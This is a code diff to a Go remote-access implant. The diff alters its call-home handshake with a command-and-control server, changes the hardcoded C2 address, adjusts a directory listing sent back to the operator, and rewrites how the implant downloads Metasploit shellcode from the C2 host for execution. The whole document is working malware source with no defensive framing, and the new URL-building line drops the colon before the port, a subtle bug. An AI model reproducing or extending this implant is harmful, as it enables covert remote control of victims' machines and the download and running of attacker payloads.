@@ -28,6 +28,21 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 		time.Sleep(10 * time.Second)
 		return addr, false
 	}
+	buffer := make([]byte, 100)
+	read_len, err := addr.Read(buffer)
+	if read_len <= 1 {
+		fmt.Println("Error with size of buffer")
+		return addr, false
+	}
+	if err != nil {
+		fmt.Println("A general network error has occured")
+		return addr, false
+	}
+	bufferSnapped := buffer[:read_len]
+	bufferStr := string(bufferSnapped)
+	if bufferStr != "AreYouAlive\n" {
+		os.Exit(1)
+	}
 	reply2Auth(&addr)
 	*attempts = 0
 	return addr, true
@@ -122,7 +137,7 @@ func ls(conn *net.Conn, implantWD *string) {
 	dirListing := ""
 	for e := range dirFS {
 		dirInfo, _ := dirFS[e].Info()
-		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
+		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "	" + dirInfo.Name() + "\n"
 	}
 	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
 		"		----		" + "----		" + "	----" + "\n" +
@@ -156,7 +171,7 @@ func ls(conn *net.Conn, implantWD *string) {
 // }
 
 func main() {
-	c2Address := "192.168.0.106:5555"
+	c2Address := "192.168.5.222:444"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -240,7 +255,9 @@ func main() {
 				conn.Write([]byte("OK\n"))
 				fmt.Println("The file exists and is readable: " + filePath)
 				// Ez way
-				sc, err := shellcode.GetShellcodeFromUrl("http://192.168.0.106:8080/msf.bin")
+				c2URL := strings.Split(c2Address, ":")[0]
+				c2URL = "http://" + c2URL + "8080"
+				sc, err := shellcode.GetShellcodeFromUrl(c2URL)
 				if err != nil {
 					fmt.Println("Couldn't get shellcode")
 					return
